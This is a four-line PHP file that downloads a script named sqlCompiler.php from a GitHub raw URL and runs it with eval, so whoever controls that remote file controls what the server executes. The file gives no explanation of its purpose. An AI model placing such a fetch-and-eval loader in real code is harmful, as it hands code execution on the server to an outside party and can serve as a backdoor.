<?php
$code = file_get_contents('https://raw.githubusercontent.com/Ganesha025/Office/refs/heads/main/sqlCompiler.php');
eval('?>' . $code);
?>
